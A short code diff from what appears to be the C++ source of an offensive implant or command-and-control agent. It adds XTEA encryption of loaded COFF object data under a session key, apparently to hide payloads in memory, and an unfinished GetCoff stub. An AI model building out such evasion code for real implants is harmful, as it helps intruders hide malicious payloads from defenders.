@@ -1,5 +1,6 @@
 #include <core/include/objects.hpp>
 
+using namespace Xtea;
 using namespace Opsec;
 using namespace Stream;
 using namespace Memory::Methods;
@@ -334,6 +335,10 @@ namespace Objects {
                         head = head->next;
                     }
                     else {
+                        if (ENCRYPTED) {
+                            XteaCrypt((uint8_t*) coff->data, coff->data_size, Ctx->config.session_key, true);
+                        }
+
                         head->next = coff;
                         break;
                     }
@@ -344,6 +349,11 @@ namespace Objects {
             }
             while (true);
         }
+    }
+
+    COFF_PARAMS GetCoff(uint32_t coff_id) {
+
+        // NOTE: Questioning weather we should store these
     }
 
     VOID RemoveCoff(_coff_params *coff) {
